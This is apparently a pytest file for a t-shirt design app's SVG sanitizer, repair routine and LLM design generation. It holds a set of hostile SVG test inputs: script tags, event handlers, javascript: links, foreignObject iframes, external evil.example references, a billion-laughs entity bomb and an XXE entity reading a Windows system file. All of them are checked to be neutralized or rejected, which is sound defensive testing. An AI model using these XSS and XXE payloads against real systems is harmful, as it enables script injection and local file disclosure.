"""design.py: SVG sanitizer (incl. malicious inputs), reply parsing, spec derivation, generation."""

from __future__ import annotations

import json
import xml.etree.ElementTree as ET

import pytest

from app import design, store
from app.errors import ConflictError, LLMError, NotFoundError
from tests.factories import SIMPLE_SVG, make_profile, seed_session

SVG_NS = "{http://www.w3.org/2000/svg}"


def _svg(body: str, attrs: str = 'viewBox="0 0 1000 1000"') -> str:
    return f'<svg xmlns="http://www.w3.org/2000/svg" {attrs}>{body}</svg>'


def assert_safe(out: str) -> ET.Element:
    """Structural safety invariants every sanitizer output must satisfy."""
    root = ET.fromstring(out)
    assert root.tag == f"{SVG_NS}svg"
    for el in root.iter():
        assert el.tag.startswith(SVG_NS), el.tag
        assert el.tag[len(SVG_NS):] in design.ALLOWED_ELEMENTS, el.tag
        for key, value in el.attrib.items():
            assert not key.lower().startswith("on"), key
            if key in ("href", "{http://www.w3.org/1999/xlink}href"):
                assert value.startswith("#"), value
            lowered = value.lower()
            assert "javascript" not in lowered and "data:" not in lowered and "expression(" not in lowered
            if "url(" in lowered:
                assert lowered.startswith("url(#") or lowered.startswith("url('#") or lowered.startswith('url("#')
    lowered = out.lower()
    for banned in ("<script", "foreignobject", "<style", "<image", "<use", "<a ", "<animate", "<set", "<iframe"):
        assert banned not in lowered, banned
    assert len(out.encode()) <= design.MAX_SVG_BYTES
    return root


# =========================================================================== sanitizer: good input


def test_clean_svg_round_trips():
    out = design.sanitize_svg(SIMPLE_SVG)
    root = assert_safe(out)
    assert root.get("viewBox") == "0 0 1000 1000"
    assert out.startswith('<svg xmlns="http://www.w3.org/2000/svg"')
    circle = root.find(f"{SVG_NS}circle")
    assert circle.get("fill") == "#ff3b30" and circle.get("r") == "300"
    assert root.find(f"{SVG_NS}text").text == "TEE"


def test_keeps_gradients_clip_masks_and_local_refs():
    src = _svg(
        '<defs><linearGradient id="g1" x1="0" y1="0" x2="1" y2="1" gradientUnits="objectBoundingBox">'
        '<stop offset="0" stop-color="#FF3B30"/><stop offset="1" stop-color="#2f5bff" stop-opacity="0.8"/>'
        '</linearGradient><linearGradient id="g2" href="#g1"/>'
        '<clipPath id="c"><circle cx="500" cy="500" r="400"/></clipPath>'
        '<mask id="m"><rect width="1000" height="1000" fill="#fff"/></mask></defs>'
        '<g clip-path="url(#c)" mask="url(#m)" transform="rotate(10 500 500)">'
        '<rect x="100" y="100" width="800" height="800" fill="url(#g1)" stroke="url(\'#g2\') #000"/></g>'
        '<text x="500" y="900" font-family="sans-serif" font-weight="800" letter-spacing="4" '
        'text-anchor="middle" dominant-baseline="middle">떡볶이 <tspan fill="#ff3b30">NIGHT</tspan> MARKET</text>'
    )
    out = design.sanitize_svg(src)
    root = assert_safe(out)
    assert root.find(f".//{SVG_NS}linearGradient[@id='g2']").get("href") == "#g1"
    g = root.find(f"{SVG_NS}g")
    assert g.get("clip-path") == "url(#c)" and g.get("mask") == "url(#m)"
    assert root.find(f".//{SVG_NS}rect[@fill='url(#g1)']") is not None
    text = root.find(f"{SVG_NS}text")
    assert "".join(text.itertext()) == "떡볶이 NIGHT MARKET"


def test_style_attribute_becomes_presentation_attributes():
    out = design.sanitize_svg(_svg('<rect width="10" height="10" fill="#000" style="fill: #FF0000 !important; '
                                   'stroke:#00f;stroke-width:3; position:absolute"/>'))
    rect = assert_safe(out).find(f"{SVG_NS}rect")
    assert rect.get("fill") == "#FF0000" and rect.get("stroke") == "#00f" and rect.get("stroke-width") == "3"
    assert "style" not in rect.attrib and "position" not in out


def test_font_family_gets_generic_fallback():
    out = design.sanitize_svg(_svg('<text font-family="Pretendard">A</text><text font-family="serif">B</text>'))
    texts = assert_safe(out).findall(f"{SVG_NS}text")
    assert texts[0].get("font-family") == "Pretendard, sans-serif"
    assert texts[1].get("font-family") == "serif"


@pytest.mark.parametrize(
    ("attrs", "expected"),
    [
        ('viewBox="0 0 1000 1000" width="500" height="500"', "0 0 1000 1000"),
        ("", "0 0 1000 1000"),
        ('viewBox="0 0 800 600"', "0 -100 800 800"),
        ('viewBox="0,0,300,600"', "-150 0 600 600"),
        ('width="400px" height="200px"', "0 -100 400 400"),
        ('width="100%" height="100%"', "0 0 1000 1000"),
        ('viewBox="0 0 0 0"', "0 0 1000 1000"),
    ],
)
def test_viewbox_is_square_and_root_size_removed(attrs, expected):
    root = assert_safe(design.sanitize_svg(_svg('<rect width="1" height="1"/>', attrs)))
    assert root.get("viewBox") == expected
    assert root.get("width") is None and root.get("height") is None


def test_missing_xmlns_and_undeclared_prefixes_are_tolerated():
    src = ('<svg viewBox="0 0 1000 1000" inkscape:version="1.0"><linearGradient id="a"/>'
           '<linearGradient id="b" xlink:href="#a"/><path d="M0 0 L10 10" sodipodi:nodetypes="cc"/></svg>')
    root = assert_safe(design.sanitize_svg(src))
    assert root.find(f"{SVG_NS}linearGradient[@id='b']").get("href") == "#a"
    assert root.find(f"{SVG_NS}path").get("d") == "M0 0 L10 10"


def test_html_entities_and_bare_ampersands_are_fixed():
    root = assert_safe(design.sanitize_svg(_svg("<text>R&B&nbsp;&copy; &amp; &#x2665; &bogus;</text>")))
    assert root.find(f"{SVG_NS}text").text == "R&B\u00a0\u00a9 & \u2665 &bogus;"


# =========================================================================== sanitizer: malicious input

MALICIOUS = {
    "script element": _svg('<script>alert(1)</script><script xlink:href="https://evil.example/x.js"/>'
                           '<rect width="1" height="1"/>'),
    "script in g": _svg('<g><script type="text/javascript"><![CDATA[alert(1)]]></script><rect width="1" height="1"/></g>'),
    "onload on root": '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><rect width="1" height="1"/></svg>',
    "event handlers": _svg('<rect width="1" height="1" onclick="alert(1)" onmouseover="x()" ONLOAD="y()"/>'),
    "foreignObject": _svg('<foreignObject width="100" height="100"><body xmlns="http://www.w3.org/1999/xhtml">'
                          '<iframe src="https://evil.example"/></body></foreignObject><circle r="5"/>'),
    "external href on gradient": _svg('<linearGradient id="g" href="https://evil.example/g.svg#x"/>'
                                      '<rect width="1" height="1" fill="url(#g)"/>'),
    "external use": _svg('<use href="https://evil.example/sprite.svg#icon"/><rect width="1" height="1"/>'),
    "xlink javascript": '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">'
                        '<a xlink:href="javascript:alert(1)"><rect width="1" height="1"/></a>'
                        '<linearGradient id="g" xlink:href="javascript:alert(1)"/><circle r="5"/></svg>',
    "style url": _svg('<rect width="1" height="1" style="fill:url(https://evil.example/x.svg#p);stroke:#000"/>'
                      '<rect width="1" height="1" style="background-image:url(javascript:alert(1))"/>'),
    "style expression": _svg('<rect width="1" height="1" style="fill:expression(alert(1))"/>'
                             '<rect width="1" height="1" style="fill:\\75 rl(x)"/>'),
    "style element": _svg('<style>@import url(https://evil.example/x.css); rect{fill:url(https://evil/x)}</style>'
                          '<rect width="1" height="1"/>'),
    "external url fill": _svg('<rect width="1" height="1" fill="url(https://evil.example/x.svg#a)" '
                              'filter="url(https://evil.example/f.svg#f)"/>'),
    "image data uri": _svg('<image href="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=" width="10" height="10"/>'
                           '<rect width="1" height="1"/>'),
    "animate href": _svg('<a><animate attributeName="href" to="javascript:alert(1)"/><text>x</text></a>'
                         '<set attributeName="onload" to="alert(1)"/><rect width="1" height="1"/>'),
    "xhtml namespace script": '<svg xmlns="http://www.w3.org/2000/svg" xmlns:h="http://www.w3.org/1999/xhtml">'
                              '<h:script>alert(1)</h:script><h:img src="x" onerror="alert(1)"/>'
                              '<rect width="1" height="1"/></svg>',
    "stylesheet PI": '<?xml-stylesheet type="text/css" href="https://evil.example/x.css"?>'
                     + _svg('<!-- <script>alert(1)</script> --><rect width="1" height="1"/>'),
    "javascript in attribute": _svg('<rect width="1" height="1" fill="javascript:alert(1)" '
                                    'transform="translate(1) &#106;avascript:x"/>'),
}


@pytest.mark.parametrize("name", list(MALICIOUS))
def test_malicious_svgs_are_neutralized(name):
    out = design.sanitize_svg(MALICIOUS[name])
    assert_safe(out)
    lowered = out.lower()
    assert "alert" not in lowered and "evil.example" not in lowered


@pytest.mark.parametrize("name", list(MALICIOUS))
def test_sanitizer_is_idempotent(name):
    once = design.sanitize_svg(MALICIOUS[name])
    assert design.sanitize_svg(once) == once  # orders.print_svg re-sanitizes stored designs


def test_style_url_keeps_safe_declarations():
    out = design.sanitize_svg(MALICIOUS["style url"])
    first = assert_safe(out).find(f"{SVG_NS}rect")
    assert first.get("stroke") == "#000" and first.get("fill") is None


@pytest.mark.parametrize(
    "src",
    [
        # billion laughs
        '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY a "lol"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;">'
        '<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;">]><svg xmlns="http://www.w3.org/2000/svg"><text>&c;</text></svg>',
        # XXE: local file
        '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
        '<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>',
        # external DTD / parameter entities
        '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://evil.example/svg.dtd">'
        '<svg xmlns="http://www.w3.org/2000/svg"><rect width="1" height="1"/></svg>',
        '<!doctype svg><svg xmlns="http://www.w3.org/2000/svg"><rect width="1" height="1"/></svg>',
    ],
)
def test_dtds_and_entities_are_rejected(src):
    with pytest.raises(ValueError, match="DOCTYPE"):
        design.sanitize_svg(src)


@pytest.mark.parametrize(
    "src",
    [
        "",
        "   ",
        "not xml at all",
        '<svg xmlns="http://www.w3.org/2000/svg"><rect',  # truncated
        "<html><body>hi</body></html>",  # wrong root
        '<svg xmlns="http://www.w3.org/2000/svg"><g><defs/></g><title>x</title></svg>',  # nothing drawable
        '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',  # nothing left
        '<x:svg xmlns:x="http://evil.example/ns"><x:rect/></x:svg>',  # foreign namespace root
    ],
)
def test_unusable_svgs_raise(src):
    with pytest.raises(ValueError):
        design.sanitize_svg(src)


def test_size_limit_enforced():
    rects = "".join(f'<rect x="{i}" y="{i}" width="10" height="10" fill="#ff3b30" stroke="#141414"/>'
                    for i in range(3000))
    with pytest.raises(ValueError, match="larger than 200 KB"):
        design.sanitize_svg(_svg(rects))
    with pytest.raises(ValueError, match="too large"):
        design.sanitize_svg(_svg("<rect/>" * 200_000))
    # just under the limit is fine
    assert_safe(design.sanitize_svg(_svg("".join(f'<rect x="{i}" width="1" height="1"/>' for i in range(500)))))


def test_second_url_in_paint_fallback_is_dropped():
    out = design.sanitize_svg(_svg('<rect width="1" height="1" fill="url(#a) url(evil.svg)" stroke="url(#a) red"/>'))
    rect = assert_safe(out).find(f"{SVG_NS}rect")
    assert rect.get("fill") is None and rect.get("stroke") == "url(#a) red"


def test_absurd_viewbox_numbers_fall_back_to_default():
    root = assert_safe(design.sanitize_svg(_svg('<rect width="1" height="1"/>', 'viewBox="0 0 1e999 1e999"')))
    assert root.get("viewBox") == "0 0 1000 1000"


def test_deep_nesting_is_cut_not_crashed():
    deep = "<g>" * 200 + '<rect width="1" height="1"/>' + "</g>" * 200
    out = design.sanitize_svg(_svg(deep + '<circle r="1"/>'))
    assert_safe(out)


# =========================================================================== repair before rejecting


def _repaired(src: str) -> ET.Element:
    with pytest.raises(ValueError, match="not well-formed"):
        design.sanitize_svg(src)  # the strict sanitizer still refuses it as written
    out = design.sanitize_svg(design.repair_svg(src))
    assert design.sanitize_svg(out) == out
    return assert_safe(out)


def test_repair_duplicate_attributes_keep_the_last_value():
    root = _repaired(_svg('<text x="500" y="500" font-weight="700" fill="#000" font-weight="900">A</text>'))
    text = root.find(f"{SVG_NS}text")
    assert (text.get("font-weight"), text.get("fill"), text.get("x"), text.text) == ("900", "#000", "500", "A")
    # seen live (claude-sonnet-5-5): the model corrects itself mid-tag
    root = _repaired(_svg('<text x="500" y="865" text-anchor="middle" font-family="sans-serif" font-size=" thirty" '
                          'font-size="30" font-weight="700" fill="#2f5bff">SEOUL AFTER DARK</text>'))
    assert root.find(f"{SVG_NS}text").get("font-size") == "30"


def test_repair_closes_open_and_misnested_tags():
    root = _repaired(_svg('<g fill="#ff3b30"><rect width="10" height="10"><circle r="5"/></g>'
                          '<linearGradient id="g"><stop offset="0"><stop offset="1"></linearGradient>'
                          '<g><text x="1">HI<tspan>!</text>'))  # tspan and the last g are never closed
    first = root.find(f"{SVG_NS}g")
    assert [el.tag for el in first] == [f"{SVG_NS}rect", f"{SVG_NS}circle"]  # a shape is never a parent
    assert len(root.find(f"{SVG_NS}linearGradient")) == 2
    assert "".join(root.find(f".//{SVG_NS}text").itertext()) == "HI!"
    root = _repaired(_svg('<g><circle r="1"/></g\n<rect width="2" height="2"/>'))  # an end tag missing its ">"
    assert [el.tag for el in root] == [f"{SVG_NS}g", f"{SVG_NS}rect"]


def test_repair_drops_text_around_the_root_and_tolerates_missing_xmlns():
    root = _repaired('Here you go: <svg viewBox="0 0 10 10"><rect width="1" height="1"/></svg> Enjoy!</g>'
                     '<svg><circle r="1"/></svg>')
    assert [el.tag for el in root] == [f"{SVG_NS}rect"]


def test_repair_escapes_stray_brackets_and_splits_run_together_attributes():
    root = _repaired(_svg('<!-- background -- layer --><rect x="1"y="2" width=30 height=40/>'
                          '<text x="5" fill="#000" stroke="a<b">Seoul <3 & you</text>'))
    rect = root.find(f"{SVG_NS}rect")
    assert (rect.get("x"), rect.get("y"), rect.get("width"), rect.get("height")) == ("1", "2", "30", "40")
    text = root.find(f"{SVG_NS}text")
    assert text.text == "Seoul <3 & you" and text.get("stroke") is None  # "<" is never a safe value


@pytest.mark.parametrize("name", list(MALICIOUS))
def test_repaired_malicious_svgs_are_still_neutralized(name):
    broken = MALICIOUS[name].replace("<svg ", '<svg version="1" version="1.1" ', 1) + "</g> trailing junk"
    with pytest.raises(ValueError):
        design.sanitize_svg(broken)
    out = design.sanitize_svg(design.repair_svg(broken))
    assert_safe(out)
    assert "alert" not in out.lower() and "evil.example" not in out.lower()


def test_repair_leaves_dtds_for_the_sanitizer_to_reject():
    src = ('<!DOCTYPE svg [<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]>'
           '<svg xmlns="http://www.w3.org/2000/svg"><text a="1" a="2">&x;</text></svg>')
    assert design.repair_svg(src) == src
    with pytest.raises(ValueError, match="DOCTYPE"):
        design.sanitize_svg(design.repair_svg(src))


def test_reply_repair_paths():
    good = _svg('<circle cx="500" cy="500" r="300" fill="#ff3b30"/>')
    # strict first: a clean candidate is never rewritten
    assert design._sanitize_reply(_reply("A", good)) == (design.sanitize_svg(good), None)
    # the model forgot </svg> but closed its code fence
    svg, defect = design._sanitize_reply('```svg\n<svg viewBox="0 0 1000 1000"><g><circle r="5" fill="#ff3b30"/>\n```')
    assert defect == "no closing </svg>"
    assert assert_safe(svg).find(f"{SVG_NS}g/{SVG_NS}circle").get("r") == "5"
    # cut off mid-SVG (no closing fence): incomplete, so not "repaired"
    with pytest.raises(ValueError, match="cut off"):
        design._sanitize_reply('```svg\n<svg viewBox="0 0 1000 1000"><circle r="5"/><rect x="1')


def test_repair_that_would_lose_shapes_is_rejected():
    # an unknown element left open swallows every later shape, which the sanitizer then drops
    src = _svg('<rect width="1" height="1"/><blob><circle r="1"/><circle r="2"/><circle r="3"/>'
               '<rect x="1" y="1" width="1" height="1" fill="#000" fill="#fff"/>')
    with pytest.raises(ValueError, match="duplicate attribute"):
        design._sanitize_reply(_reply("A", src))


# =========================================================================== reply parsing


def _reply(title: str, svg: str, *, shirt: str = "#faf7f2", palette=("#ff3b30", "#141414")) -> str:
    meta = {"title": title, "concept": f"{title}: a test concept.", "palette": list(palette), "shirt_color": shirt}
    return f"Here you go!\n```json\n{json.dumps(meta)}\n```\n```svg\n{svg}\n```\nEnjoy."


def test_extract_svg_variants():
    fenced = _reply("A", SIMPLE_SVG)
    assert design.extract_svg(fenced) == [SIMPLE_SVG]
    as_json = json.dumps({"title": "A", "svg": SIMPLE_SVG})
    assert SIMPLE_SVG in design.extract_svg(as_json)
    nested = _svg('<svg x="0" y="0" viewBox="0 0 10 10"><rect width="1" height="1"/></svg>')
    assert design.extract_svg(f"prose {nested} more prose") == [nested, nested[: nested.find("</svg>") + 6]]
    assert design.extract_svg("cut off: <svg xmlns='http://www.w3.org/2000/svg'><rect") == []
    assert design.extract_svg("") == []


def test_palette_from_svg_counts_visible_colors_and_default_black():
    svg = design.sanitize_svg(_svg(
        '<defs><clipPath id="c"><rect fill="#00ff00" width="1" height="1"/></clipPath>'
        '<linearGradient id="g"><stop stop-color="#123456"/></linearGradient></defs>'
        '<rect fill="#FF3B30" width="1" height="1"/><rect fill="#ff3b30" width="1" height="1"/>'
        '<circle r="1"/><g fill="white"><circle r="2"/></g><path d="M0 0" fill="none" stroke="navy"/>'
    ))
    palette = design.palette_from_svg(svg)
    assert palette[0] == "#ff3b30"
    assert set(palette) == {"#ff3b30", "#000000", "#ffffff", "#000080", "#123456"}
    assert "#00ff00" not in palette  # clip geometry is never painted


def test_recommend_spec_from_profile():
    profile = make_profile()  # fits: oversized, boxy; brief mentions cream
    spec = design.recommend_spec(profile, ["#141414", "#ff3b30"], "#faf7f2")
    assert spec.fit == "oversized"
    assert spec.material == "heavyweight_cotton"  # "boxy" fit -> heavyweight
    assert spec.shirt_color == "#faf7f2"  # model hint contrasts well with dark ink
    assert (spec.print_method, spec.placement, spec.quantity, spec.size) == ("dtg", "front_center", 1, "M")


def test_recommend_spec_overrides_low_contrast_hint():
    profile = make_profile()
    spec = design.recommend_spec(profile, ["#faf7f2", "#ffffff"], "#ffffff")  # light art on white? no.
    assert design.contrast_ratio(spec.shirt_color, "#faf7f2") >= 3


def test_recommend_spec_keywords_and_avoid():
    profile = make_profile()
    profile.taste.fits = ["slim, fitted cut", "long sleeve"]
    profile.taste.aesthetics = ["eco-conscious minimalism", "organic textures"]
    profile.taste.avoid = ["decor overload"]
    spec = design.recommend_spec(profile, ["#141414"])
    assert (spec.fit, spec.material, spec.sleeve) == ("slim", "organic_cotton", "long")
    profile.taste.aesthetics = ["athleisure", "soft drape"]
    profile.taste.avoid = ["polyester", "synthetic blends"]
    profile.taste.fits = ["regular"]
    profile.tshirt_brief = "simple"
    assert design.recommend_spec(profile, ["#141414"]).material == "cotton"  # tri_blend banned by avoid


# =========================================================================== generation (fake LLM)

GOOD = {
    "TYPE-LED": _svg('<text x="500" y="500" font-family="Pretendard" font-size="160" fill="#141414">밤시장</text>'),
    "ILLUSTRATIVE EMBLEM": _svg('<circle cx="500" cy="500" r="380" fill="#ff3b30"/>'
                                '<rect x="300" y="420" width="400" height="160" fill="#141414"/>'),
    "ABSTRACT": _svg('<polygon points="100,900 500,100 900,900" fill="#2f5bff"/>'
                     '<circle cx="500" cy="620" r="120" fill="#ff3b30"/>'),
    "LINE ART": _svg('<path d="M200 700 Q500 200 800 700" fill="none" stroke="#141414" stroke-width="12"/>'
                     '<line x1="200" y1="760" x2="800" y2="760" stroke="#ff3b30" stroke-width="12"/>'),
}
PRIMARY = ("TYPE-LED", "ILLUSTRATIVE EMBLEM", "ABSTRACT")  # a fresh batch's 3 directions; LINE ART is the spare


def _direction(user: str) -> str:
    return next(key for key in GOOD if key in user)


def test_generate_three_concepts_concurrently(fake_llm, client):
    rec = seed_session(done=True, profile=True, designs=1)
    fake_llm.on("chat_text", lambda call: _reply(f"Concept {_direction(call.user)}", GOOD[_direction(call.user)]))

    res = client.post(f"/api/design/{rec.id}/generate", json={"feedback": None, "base_design_id": None, "count": 3})
    assert res.status_code == 200
    designs = res.json()["designs"]
    assert len(designs) == 3
    assert [d["title"] for d in designs] == [f"Concept {k}" for k in PRIMARY]  # all ready: the spare is dropped
    assert len({d["id"] for d in designs}) == 3

    calls = fake_llm.calls_of("chat_text")
    assert len(calls) == 4 and {_direction(c.user) for c in calls} == set(GOOD)  # 3 directions + 1 spare
    assert all(c.model == "gpt-6-luna" and "South Korea" in c.user for c in calls)
    assert all(rec.profile.tshirt_brief in c.user and "viewBox" in c.system for c in calls)

    for d in designs:
        root = assert_safe(d["svg"])
        assert root.get("viewBox") == "0 0 1000 1000"
        assert d["palette"] and all(p.startswith("#") and len(p) == 7 for p in d["palette"])
        assert d["recommended_spec"]["fit"] == "oversized"
        assert d["concept"].endswith("a test concept.")
    typographic = next(d for d in designs if "TYPE" in d["title"])
    assert "Pretendard, sans-serif" in typographic["svg"]

    stored = store.require_session(rec.id).designs
    assert [d.id for d in stored[1:]] == [d["id"] for d in designs]  # appended after the existing one
    state = client.get(f"/api/session/{rec.id}").json()
    assert len(state["designs"]) == 4


def test_generate_sanitizes_hostile_model_output(fake_llm):
    import asyncio

    rec = seed_session(done=True, profile=True)
    evil = _svg('<script>alert(1)</script><rect width="10" height="10" fill="#ff3b30" onclick="steal()"/>'
                '<foreignObject><iframe src="https://evil.example"/></foreignObject>')
    fake_llm.on("chat_text", lambda call: _reply("Evil", evil))
    [made] = asyncio.run(design.generate(rec.id, None, None, 1))
    assert_safe(made.svg)
    assert "alert" not in made.svg and "steal" not in made.svg and "evil.example" not in made.svg


def test_failed_concept_is_retried_once_then_dropped(fake_llm):
    import asyncio

    rec = seed_session(done=True, profile=True)

    def handler(call):
        key = _direction(call.user)
        if key in ("ABSTRACT", "LINE ART"):
            return "Sorry, here is half: <svg xmlns='http://www.w3.org/2000/svg'><rect"
        return _reply(key, GOOD[key])

    fake_llm.on("chat_text", handler)
    made = asyncio.run(design.generate(rec.id, "add more Hangul", None, 3))
    assert [d.title for d in made] == ["TYPE-LED", "ILLUSTRATIVE EMBLEM"]
    abstract_calls = [c for c in fake_llm.calls_of("chat_text") if "ABSTRACT" in c.user]
    assert len(abstract_calls) == 2 and "previous attempt failed" in abstract_calls[1].user
    assert all("add more Hangul" in c.user for c in fake_llm.calls_of("chat_text"))
    assert len(store.require_session(rec.id).designs) == 2


def test_spare_concept_stands_in_for_a_broken_one(fake_llm):
    import asyncio

    rec = seed_session(done=True, profile=True)

    def handler(call):
        key = _direction(call.user)
        return "I drew it in my head." if key == "ILLUSTRATIVE EMBLEM" else _reply(key, GOOD[key])

    fake_llm.on("chat_text", handler)
    made = asyncio.run(design.generate(rec.id, None, None, 3))
    assert [d.title for d in made] == ["TYPE-LED", "ABSTRACT", "LINE ART"]
    assert len(store.require_session(rec.id).designs) == 3
    calls = fake_llm.calls_of("chat_text")
    assert len(calls) == 4 and not any("previous attempt failed" in c.user for c in calls)  # no retry needed


def test_broken_revision_gets_one_corrective_retry(fake_llm):
    import asyncio

    rec = seed_session(done=True, profile=True, designs=1)
    fake_llm.text("Here is the idea, no SVG this time.").text(_reply("Fixed", GOOD["ABSTRACT"]))
    [made] = asyncio.run(design.generate(rec.id, "bolder", rec.designs[0].id, 1))
    calls = fake_llm.calls_of("chat_text")
    assert made.title == "Fixed" and len(calls) == 2
    assert "previous attempt failed (no complete <svg>" in calls[1].user and "bolder" in calls[1].user


def test_malformed_svg_is_repaired_without_a_retry(fake_llm, caplog):
    import asyncio
    import logging

    rec = seed_session(done=True, profile=True)
    broken = ('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 1000">\n'
              '<rect x="100" y="100" width="800" height="300" fill="#ff3b30">\n'
              '<text x="500" y="700" font-family="sans-serif" font-size="120" fill="#141414" '
              'font-weight="700" font-weight="900">R&B 야시장</text>\n</svg>')
    fake_llm.on("chat_text", lambda call: _reply("Night Market", broken))
    with caplog.at_level(logging.INFO, logger="teedentity.design"):
        [made] = asyncio.run(design.generate(rec.id, None, None, 1))
    assert len(fake_llm.calls_of("chat_text")) == 2  # the concept and the spare; no corrective retry
    root = assert_safe(made.svg)
    text = root.find(f"{SVG_NS}text")
    assert text.get("font-weight") == "900" and text.text == "R&B 야시장"
    assert root.find(f"{SVG_NS}rect").get("fill") == "#ff3b30" and made.title == "Night Market"
    assert "repaired a malformed SVG (SVG is not well-formed XML (duplicate attribute" in caplog.text


def test_metadata_falls_back_when_missing(fake_llm):
    import asyncio

    rec = seed_session(done=True, profile=True)
    fake_llm.on("chat_text", lambda call: f"Here it is:\n{GOOD['ABSTRACT']}")
    [made] = asyncio.run(design.generate(rec.id, None, None, 1))
    assert made.title == "Typographic concept"
    assert made.concept == rec.profile.tshirt_brief
    assert made.palette == ["#2f5bff", "#ff3b30"]


def test_all_concepts_failing_is_502(fake_llm, client):
    rec = seed_session(done=True, profile=True)
    fake_llm.on("chat_text", lambda call: "I can't draw today.")
    res = client.post(f"/api/design/{rec.id}/generate", json={"count": 2})
    assert res.status_code == 502 and isinstance(res.json()["detail"], str)
    assert store.require_session(rec.id).designs == []


def test_llm_errors_propagate_as_502(fake_llm, client):
    rec = seed_session(done=True, profile=True)
    fake_llm.on("chat_text", lambda call: LLMError("The AI took too long to answer. Please try again."))
    res = client.post(f"/api/design/{rec.id}/generate", json={"count": 3})
    assert res.status_code == 502 and res.json()["detail"] == "The AI took too long to answer. Please try again."


def test_revision_mode_uses_base_svg_and_feedback(fake_llm, client):
    rec = seed_session(done=True, profile=True, designs=2)
    base = rec.designs[0]
    fake_llm.on("chat_text", lambda call: _reply("Bolder Market", GOOD["ILLUSTRATIVE EMBLEM"]))
    res = client.post(f"/api/design/{rec.id}/generate",
                      json={"feedback": 'make it "bolder"', "base_design_id": base.id, "count": 2})
    assert res.status_code == 200
    assert [d["title"] for d in res.json()["designs"]] == ["Bolder Market", "Bolder Market"]
    calls = fake_llm.calls_of("chat_text")
    assert len(calls) == 2
    for call in calls:
        assert base.svg in call.user and base.title in call.user
        assert "make it 'bolder'" in call.user  # quotes neutralized inside the quoted request
    assert calls[0].user != calls[1].user  # distinct revision approaches
    assert len(store.require_session(rec.id).designs) == 4


def test_repeat_generation_sends_unique_prompts(fake_llm):
    import asyncio

    rec = seed_session(done=True, profile=True, designs=1)
    fake_llm.on("chat_text", lambda call: _reply("Again", GOOD["ABSTRACT"]))
    asyncio.run(design.generate(rec.id, None, None, 1))
    asyncio.run(design.generate(rec.id, None, None, 1))
    asyncio.run(design.generate(rec.id, "bolder", rec.designs[0].id, 1))
    asyncio.run(design.generate(rec.id, "bolder", rec.designs[0].id, 1))
    prompts = [c.user for c in fake_llm.calls_of("chat_text")]
    assert len(prompts) == 6 and len(set(prompts)) == 6  # the gateway caches identical requests; each must differ


def test_revision_without_feedback_asks_for_variation(fake_llm):
    import asyncio

    rec = seed_session(done=True, profile=True, designs=1)
    fake_llm.on("chat_text", lambda call: _reply("Variation", GOOD["ABSTRACT"]))
    asyncio.run(design.generate(rec.id, None, rec.designs[0].id, 1))
    assert "fresh variation" in fake_llm.calls_of("chat_text")[0].user


def test_generate_guards():
    import asyncio

    no_profile = seed_session(done=True)
    with pytest.raises(ConflictError):
        asyncio.run(design.generate(no_profile.id, None, None, 1))
    rec = seed_session(done=True, profile=True)
    with pytest.raises(NotFoundError):
        asyncio.run(design.generate(rec.id, "bolder", "missing", 1))
    with pytest.raises(NotFoundError):
        asyncio.run(design.generate("missing", None, None, 1))


def test_stored_designs_are_capped(fake_llm):
    import asyncio

    rec = seed_session(done=True, profile=True, designs=design._MAX_STORED_DESIGNS - 1)
    oldest = rec.designs[0].id
    fake_llm.on("chat_text", lambda call: _reply("New", GOOD[_direction(call.user)]))
    made = asyncio.run(design.generate(rec.id, None, None, 3))
    stored = store.require_session(rec.id).designs
    assert len(stored) == design._MAX_STORED_DESIGNS
    assert stored[-3:] == made and oldest not in {d.id for d in stored}
